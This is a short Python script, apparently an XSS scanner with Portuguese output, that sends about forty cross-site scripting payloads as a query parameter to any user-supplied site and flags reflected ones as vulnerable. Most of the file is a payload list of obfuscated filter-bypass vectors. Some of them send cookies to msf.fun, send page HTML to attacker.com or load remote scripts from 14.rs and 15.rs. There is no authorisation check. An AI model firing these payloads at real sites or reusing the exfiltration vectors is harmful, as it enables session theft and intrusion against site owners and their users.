#pip install requests beautifulsoup4
import requests
from bs4 import BeautifulSoup

def test_xss_payloads(site, payloads):
    results = {}
    for payload in payloads:
        try:          
            url = f"{site}?input={payload}"
            response = requests.get(url)   
            soup = BeautifulSoup(response.text, 'html.parser')
            if payload in soup.prettify():
                results[payload] = "Vulnerável (XSS detectado)"
            else:
                results[payload] = "Não vulnerável (XSS não detectado)"        
        except Exception as e:
            results[payload] = f"Erro ao testar: {str(e)}"   
    return results



xss_payloads = [
    "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert\"';>",
    "<iframe/onload=\"var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a\">",
    "<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document[\"cook\"+\"ie\"]' src=x>",
    "<img/src=q onerror='new Function`al\\ert\\`1\\'>",
    "<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
    "<svg onload\r\n=$.globalEval(\"al\"+\"ert()\");>",
    "[1].map(alert)   or    (alert)(1)",
    "<\"><details/open/ontoggle=\"jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;\">XXXXX</a>",
    "[1].find(confirm)",
    "<svg/onload=self[aler%2bt]1>",
    "%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E",
    "'-[document.domain].map(alert)-'",
    "\"><input type=\"hidden\" ancontentvisibilityautostechange=\"confirm=(/bypassed/)>\"> style=\"content-visibility:auto\"",
    "<A/hREf=\"j%0aavas%09cript%0a:%09con%0afirm%0d\">z",
    "<d3\"<\"/onclick=\"1>[confirm]\"<\">z",
    "<d3/onmouseenter=[2].find(confirm)>z",
    "<details open ontoggle=confirm()>",
    "<script y=\"><\">/<script /prompt()</script>",
    "<w=\"/x=\"y>\"/ondblclick=<[confir\\u006d]>z",
    "<a href=\"javascript%26colon;alert(1)\">click",
    "<a href=javas&#99;ript:alert(1)>click",
    "<script/\"<a\"/src=data:=\".<a,[8].some(confirm)>",
    "<svg/x=\">\"/onload=confirm()//",
    "<--`<img/src=` onerror=confirm> --!>",
    "<svg%0Aonload=%09((pro\\u006dpt))()//",
    "<sCript x>(((confirm)))``</scRipt x>",
    "<svg </onload =\"1> (_=prompt,_(1)) \">",
    "<!--><script src=//14.rs>",
    "<embed src=//14.rs>",
    "<script x=\">\" src=//15.rs></script>",
    "<!'/'//'//\"/--></Script><Image SrcSet=K/; OnError=confirm1 //>",
    "<iframe/src //onload = prompt(1)",
    "<x oncut=alert()>x",
    "<svg onload=write()>",
    "<svg/onload=\"(new Image()).src='//attacker.com/'+document.documentElement.innerHTML\">",
    "\"><svg onload=alert()>",
    "\"><svg onload=alert()><b attr=\"",
    "\" onmouseover=alert() ",
    "\"onmouseover=alert()//",
    "\"autofocus/onfocus=\"alert()",
    "details/open/ontoggle=confirm('xss')"
]


site_testado = input("/s")


resultados = test_xss_payloads(site_testado, xss_payloads)


for payload, resultado in resultados.items():
    print(f"Payload: {payload}\nResultado: {resultado}\n")

